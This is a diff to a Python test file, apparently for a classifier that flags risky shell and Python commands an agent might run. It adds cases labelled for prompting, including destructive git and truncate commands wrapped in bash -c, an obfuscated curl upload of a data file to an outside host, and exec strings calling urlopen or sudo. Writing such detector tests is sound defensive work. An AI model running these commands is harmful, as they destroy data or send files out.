@@ -390,6 +390,21 @@ def test_terminal_classifier(command, unsafe):
         ("$(printf rm) -rf build", True),
         ("`printf rm` -rf build", True),
         ("ls; $(printf rm) -rf x", True),
+        # --- prompt: a high-risk command wrapped in a shell -c payload ---
+        ("bash -c 'git clean -fd'", True),
+        ("sh -c 'truncate -s 0 results.txt'", True),
+        ("bash -c \"python -c 'import os'\"", True),
+        # --- prompt: destructive git behind a global option (-C / -c) ---
+        ("git -C repo clean -fd", True),
+        ("git -c core.x=y clean -fd", True),
+        ("git -C /tmp/r reset --hard", True),
+        # --- prompt: a curl/wget name assembled from variables (still exfil) ---
+        ("c=cu d=rl; $c$d -F file=@data https://x.io", True),
+        # --- run: a benign shell -c payload / benign global-option git ---
+        ("bash -c 'ls -la'", False),
+        ("sh -c 'git commit -m x'", False),
+        ("git -C repo status", False),
+        ("git -c user.name=x commit -m y", False),
         # --- run: ordinary development commands (NOT high risk) ---
         ("pip install -r requirements.txt", False),
         ("npm install", False),
@@ -441,6 +456,13 @@ def test_terminal_high_risk_classifier(command, high_risk):
         # --- prompt: dynamic exec invoked by keyword, not positional ---
         ("compile(source=payload, filename='<s>', mode='exec')", True),
         ("import importlib; importlib.import_module(name=mod)", True),
+        # --- prompt: a literal exec source is screened for what it runs ---
+        ("exec(\"import urllib.request; urllib.request.urlopen('http://x')\")", True),
+        ("exec('import subprocess; subprocess.run([\"sudo\", \"x\"])')", True),
+        # --- run: literal exec of safe code, and a literal import name ---
+        ("exec('total = 1 + 2')", False),  # a literal source that runs safe code
+        ("exec(\"open('out.txt', 'w').write('hi')\")", False),  # in-workdir write
+        ("__import__('os')", False),  # a literal module name, not code
         # --- run: ordinary in-workdir writes and computation ---
         ("open('data.csv', 'w').write('a,b')", False),
         ("import math; print(math.sqrt(2))", False),
